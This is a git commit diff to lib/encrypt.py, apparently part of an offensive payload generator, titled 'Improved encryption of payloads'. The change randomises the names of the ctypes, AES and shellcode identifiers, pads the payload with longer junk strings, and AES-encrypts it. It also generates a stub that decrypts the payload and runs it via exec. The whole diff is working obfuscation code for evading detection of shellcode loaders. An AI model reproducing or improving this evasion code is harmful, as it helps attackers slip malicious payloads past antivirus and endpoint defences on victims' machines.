17f086679e46c47f9d1c76d062e3a5848272213b
charliedean <dean.charlie07@gmail.com>
2017-06-01 10:30:50 +0100

    Improved encryption of payloads

--- lib/encrypt.py
+++ lib/encrypt.py
@@ -8,7 +8,7 @@ def randomVar():
 
 def randomJunk():
     newString = ''
-    for i in xrange(random.randint(30, 50)):
+    for i in xrange(random.randint(30, 200)):
         newString += ''.join(random.sample(string.ascii_lowercase, 3))
     return newString
 
@@ -19,18 +19,23 @@ def do_Encryption(payload):
     randkey = randomVar()
     randcounter = randomVar()
     randcipher = randomVar()
-    randctypes = randomVar()
+
+    randdecrypt = randomJunk()
+    randshellcode = randomJunk()
+
+    randctypes = randomJunk()
+    randaes = randomJunk()
 
     encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
-    encrypted = encrypto.encrypt(payload.replace('ctypes',randctypes))
+    encrypted = encrypto.encrypt(payload.replace('ctypes',randctypes).replace('shellcode',randshellcode))
 
     newpayload = "# -*- coding: utf-8 -*- \n"
     newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
-    newpayload += "import Crypto.Cipher.AES as AES \nimport ctypes as %s \n" % randctypes
+    newpayload += "import Crypto.Cipher.AES as %s \nimport ctypes as %s \n" %(randaes, randctypes)
     newpayload += "%s = '%s'.decode('hex') \n" % (randkey, key.encode('hex'))
     newpayload += "%s = '%s'.decode('hex') \n" % (randcounter, counter.encode('hex'))
     newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
-    newpayload += "decrypto = AES.new(%s , AES.MODE_CTR, counter=lambda: %s )\n" % (randkey,randcounter)
-    newpayload += "%s = decrypto.decrypt('%s'.decode('hex')) \n" % (randcipher, encrypted.encode('hex'))
+    newpayload += "%s = %s.new(%s , %s.MODE_CTR, counter=lambda: %s )\n" % (randdecrypt, randaes, randkey, randaes, randcounter)
+    newpayload += "%s = %s.decrypt('%s'.decode('hex')) \n" % (randcipher, randdecrypt, encrypted.encode('hex'))
     newpayload += "exec(%s)" % randcipher
     return newpayload
